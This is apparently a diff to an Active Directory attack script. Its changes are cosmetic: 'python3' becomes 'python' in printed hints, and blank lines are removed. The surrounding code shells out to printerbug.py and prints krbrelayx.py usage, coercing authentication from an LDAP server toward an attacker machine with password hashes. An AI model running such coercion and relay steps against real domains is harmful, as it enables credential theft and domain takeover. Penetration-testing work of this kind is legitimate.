@@ -394,25 +394,12 @@ def main():
         os.system("python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
         print("Executing: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
     else:
-        print("\nExeute: python3 krbrelayx.py -hashes %s" % PASSWORD)
+        print("\nExeute: python krbrelayx.py -hashes %s" % PASSWORD)
         print("Execute coerce attack against: %s" % (ATTACKER_MACHINE))
-        print("Example: python3 printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
-
+        print("Example: python printerbug.py %s@%s -hashes %s %s" % (USERNAME.replace("\\","/").replace("$", "\\$"), LDAP_SERVER_IP, PASSWORD, ATTACKER_MACHINE))
 
     
-
-        
 if __name__ == "__main__":
   
     main()
-
-    
-
-
-
-
-
-
-
-
 
